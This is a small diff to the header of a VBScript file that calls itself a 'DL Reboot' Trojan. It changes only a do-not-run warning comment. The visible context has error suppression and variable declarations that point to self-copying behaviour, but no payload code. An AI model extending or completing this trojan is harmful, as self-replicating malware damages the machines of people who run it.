@@ -1,5 +1,5 @@
 rem - dlRB "DL Reboot" Trojan script by D.L.
-rem - Please, Don't RUN this!
+rem - Please, Don't RUN this! It's not testable scripts!!
 
 On Error Resume Next
 dim FSobj,sysDir,generateCopy,newFile,fixedCode,procreateCopy,fileData
